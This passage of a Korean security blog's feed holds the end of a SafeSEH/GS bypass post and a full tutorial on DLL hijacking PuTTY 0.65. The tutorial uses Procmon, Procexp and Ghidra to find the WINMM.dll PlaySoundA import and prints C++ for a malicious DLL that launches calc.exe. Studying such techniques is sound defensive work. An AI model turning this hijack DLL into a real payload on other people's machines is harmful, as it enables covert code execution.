&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;!mona modules
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x06_1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이 중에 SafeSEH가 적용되어 있지 않은 Module을 골라서 우회 공격을 동일하게 진행하면 됩니다.&lt;/p&gt;

&lt;p&gt;이상으로 GS편을 모두 마치겠습니다.&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Joel Park</name>
        
        
      </author>

      

      
        <category term="Posts" />
      

      
        <summary type="html">0x06 GS(2)</summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">DLL Hijacking &amp;amp; Ghidra</title>
      <link href="/Dll-Hijacking-&-Ghidra" rel="alternate" type="text/html" title="DLL Hijacking &amp; Ghidra" />
      <published>2019-03-17T19:18:00+09:00</published>
      <updated>2019-03-17T19:18:00+09:00</updated>
      <id>/Dll%20Hijacking%20&amp;%20Ghidra</id>
      <content type="html" xml:base="/Dll-Hijacking-&amp;-Ghidra">&lt;h1 id=&quot;dll-hijacking--ghidra&quot;&gt;DLL Hijacking &amp;amp; Ghidra&lt;/h1&gt;

&lt;p&gt;안녕하세요. Joel입니다.&lt;/p&gt;

&lt;p&gt;방구석에 누워있다 갑자기 DLL Hijacking 포스팅을 올리라는 일거리를 받아서 글을 쓰게 되었습니다. 허허..&lt;/p&gt;

&lt;h5 id=&quot;overview&quot;&gt;Overview&lt;/h5&gt;

&lt;p&gt;DLL Hijacking은 PE 프로그램이 의도하지 않은 external library(dll)을 실행하도록 만드는 것 입니다. 
이 공격은 DLL Search Order 때문에 취약한 PE 프로그램이 공격자가 작성한 DLL을 로드하고 실행하게 됩니다.
지금부터, 취약한 프로그램 분석과 Hijacking할 dll을 찾는 과정 등을 하나씩 살펴보도록 하겠습니다.&lt;/p&gt;

&lt;p&gt;먼저, 오늘 포스팅에서 사용한 Tool과 환경구축 내용입니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Ghidra (jdk 11 이상, 64bit 필수)&lt;/li&gt;
  &lt;li&gt;PuTTY 0.65&lt;/li&gt;
  &lt;li&gt;Sysinternals suite&lt;/li&gt;
  &lt;li&gt;Visual Studio 2017&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;find-the-dlls-which-are-loaded-by-target-application&quot;&gt;Find the dlls which are loaded by target application.&lt;/h5&gt;

&lt;h6 id=&quot;procexp&quot;&gt;Procexp&lt;/h6&gt;

&lt;p&gt;PuTTY 0.65를 실행한 뒤, Sysinternals의 Procexp.exe를 통해 어떤 dll들을 사용하는지 확인해보겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/dll/0x00_2.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;Procexp.exe에서 [View]-[Lower Pane View]-[DLLs] 설정을 하면 PuTTY 프로그램이 로드한 dll 목록들을 확인할 수 있습니다.
그런데 이것만 가지고는 어떤 dll을 hijack할 수 있는지 알 수가 없습니다. 결과만 보이기 때문이죠.&lt;/p&gt;

&lt;p&gt;그래서 이번에는 Sysinternals의 Procmon을 실행시켜서 dll이 로드되는 과정을 살펴보겠습니다.&lt;/p&gt;

&lt;h6 id=&quot;procmon&quot;&gt;Procmon&lt;/h6&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/dll/0x00_3.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;Procmon을 실행한 후 필터를 위와 같이 설정합니다. 그럼 아래와 같이 PuTTY가 dll을 로드하는 과정에서 발생한 내용들을 볼 수가 있습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/dll/0x00_4.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위 그림과 Procexp의 내용을 종합해보면 PuTTY는 WINMM.dll을 자신이 있는 디렉터리에서 먼저 찾아서 로드하려고 한다는 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;하지만 해당 디렉터리에는 WINMM.dll이 없기에 결과적으로는 C:\Windows\SysWOW64\WINMM.dll을 로드하고 있습니다.&lt;/p&gt;

&lt;p&gt;만약 해당 디렉터리에 이 WINMM.dll이 존재한다면 어떻게 될까요? ^^&lt;/p&gt;

&lt;p&gt;아 물론, 여기서 해당 디렉터리에 low priv user가 Write Access가 가능하다는 전제하에 진행하는 것입니다.&lt;/p&gt;

&lt;p&gt;만약, 해당 디렉터리가 C:\, C:\Program Files 등 Admin 권한이 필요한 경우에는 UAC 팝업이 뜨겠죠?&lt;/p&gt;

&lt;p&gt;UAC 팝업은 쉽게 우회가 가능하나, 이 글의 범위를 넘어서므로 바탕화면 특정 디렉터리에서 진행합니다.&lt;/p&gt;

&lt;p&gt;계속 갑니닷.&lt;/p&gt;

&lt;h6 id=&quot;find-a-target-function-with-ghidra&quot;&gt;Find a Target Function with Ghidra&lt;/h6&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/dll/0x00_5.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;Target Function을 Ghidra를 이용해서 찾아보겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/dll/0x00_1.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;[Symbol Tree] - [Imports] - [WINMM.dll]을 따라가면 PlaySoundA라는 함수를 찾을 수 있습니다. 쉽죠??&lt;/p&gt;

&lt;p&gt;그럼 이제 우리가 해야할 일은 Hijacking에 사용할 dll을 만드는 것 입니다.&lt;/p&gt;

&lt;h6 id=&quot;make-a-dll&quot;&gt;Make a DLL&lt;/h6&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &quot;stdafx.h&quot;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {

	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		WinExec(&quot;calc&quot;, SW_NORMAL);
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;

	}
	return true;
}

extern &quot;C&quot; __declspec(dllexport) void PlaySoundA() {
	WinExec(&quot;calc&quot;, SW_NORMAL);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;위와 같이 PuTTY가 실행될 때 계산기를 실행하도록 새로운 dll을 생성했습니다.&lt;/p&gt;

&lt;h6 id=&quot;execute-target-program&quot;&gt;Execute Target Program&lt;/h6&gt;

&lt;p&gt;아래와 같이, 같은 디렉터리에 방금 만든 dll을 위치시킨 후, 실행해보겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/dll/0x00_6.png&quot; alt=&quot;[그림 1-6]&quot; /&gt;
&lt;/figure&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/dll/0x00_7.png&quot; alt=&quot;[그림 1-7]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;계산기가 잘 실행되네요. ^^&lt;/p&gt;

&lt;p&gt;지금까지 DLL Hijacking에 대해서 알아봤습니다. 뿅!&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Joel Park</name>
        
        
      </author>

      

      
        <category term="Posts" />
      

      
        <summary type="html">DLL Hijacking &amp;amp; Ghidra</summary>
      

      
      
    </entry>
  
</feed>
